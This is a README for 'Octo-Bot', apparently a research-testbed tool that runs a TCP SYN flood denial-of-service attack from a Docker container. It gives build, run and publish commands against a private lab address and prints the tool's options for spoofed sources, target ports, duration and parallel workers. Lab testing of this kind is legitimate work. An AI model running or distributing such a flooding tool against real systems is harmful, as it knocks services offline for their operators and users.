# Octo-Bot: DDoS TCP-Syn Flood Attack Bot

## About SynFlood-Attack-Bot

This bot performs a [TCP Syn Flood attack](https://www.netscout.com/what-is-ddos/) on its intended targets. A Syn Flood is a common form of Denial-of-Service (DDoS) attack  that can target any system connected to the Internet and providing Transmission Control Protocol (TCP) services syn-flood-attacks).

## Quick Start Guide

### Install Dependencies

We should verify that the container works locally before we push it to Docker Hub. On Ubuntu, install `docker` with this following command:

```console
ncl@orchestrator:~/$ sudo apt-get update
ncl@orchestrator:~/$ sudo apt-get install docker-ce docker-ce-cli containerd.io
ncl@orchestrator:~/$ sudo docker run hello-world
``` 
The detailed steps can be found in this [link](https://docs.docker.com/install/linux/docker-ce/ubuntu/).
For other Linux distros, visit [here](https://docs.docker.com/engine/install/). (It is not recommended to use Windows for this)

### Download the Source Code
 
Download the whole source of OctoBot software from the GitHub and navigate to the specific directory
 
```console
ncl@orchestrator:~/$ git clone https://github.com/nus-ncl/OctoBot
ncl@orchestrator:~/$ cd OctoBot/Octo-Bot/synflood-attack-bot
```
 
### Build and Run the Specific Bot under Docker
 
Build the docker image locally.
 
```console
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ ./build.sh
```

Check the docker image.

```console
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ docker images
REPOSITORY                     TAG                 IMAGE ID            CREATED             SIZE
synflood-attack-bot            latest              529fceb6545d        8 minutes ago       118MB
debian                         buster-slim         108d75da320f        8 days ago          69.2MB

```

Run the docker image locally.

```console
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ docker run synflood-attack-bot:latest -t 10.10.0.189 -p 80 443
```

Check the running docker.

```console
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ sudo docker ps -a
CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS                      PORTS               NAMES
888677a369da        synflood-attack-bot:latest    "python3 main.py -r …"   38 seconds ago      Exited (0) 40 seconds ago                       blue_fish
```

### Push the docker image into Docker Hub

Tag and push the image with your Docker Hub repository's credential. Replace `korona` with your own username on Docker Hub.

```console
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ docker tag 529fceb6545d korona/synflood-attack-bot:latest
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ docker login --username=korona
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ docker push korona/synflood-attack-bot:latest
```

### Run the public docker image

Run locally the public docker image.

```console
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ docker run korona/synflood-attack-bot:latest -t 10.10.0.189 -p 80 443
```

## Help and Arguments

You can display the help right within the bot.

```console
ncl@orchestrator:~/OctoBot/Octo-Bot/synflood-attack-bot$ docker run korona/synflood-attack-bot:latest --help
usage: synflood-attack.py [-h] [--interactive] [-o ORIGIN [ORIGIN ...]]
                          [-O ORIGIN_PORT [ORIGIN_PORT ...]] -t TARGET
                          [TARGET ...] -p TARGET_PORT [TARGET_PORT ...]
                          [-i INTERFACE] [-d DURATION] [-g GAP] [-w WORKERS]

optional arguments:
  -h, --help            show this help message and exit
  --interactive         use scapy interactive console
  -o ORIGIN [ORIGIN ...], --origin ORIGIN [ORIGIN ...]
                        (optional) specify source (origin) ip
  -O ORIGIN_PORT [ORIGIN_PORT ...], --origin-port ORIGIN_PORT [ORIGIN_PORT ...]
                        (optional) specify source (origin) port
  -t TARGET [TARGET ...], --target TARGET [TARGET ...]
                        specify target ip
  -p TARGET_PORT [TARGET_PORT ...], --target-port TARGET_PORT [TARGET_PORT ...]
                        specify target port
  -i INTERFACE, --interface INTERFACE
                        (optional) specify interface
  -d DURATION, --duration DURATION
                        (optional) continuously generate traffic for a set
                        duration of time
  -g GAP, --gap GAP     (optional) gap (delay) between packets
  -w WORKERS, --workers WORKERS
                        (optional) number of workers to run in parallel per
                        ip-port combination pair

```
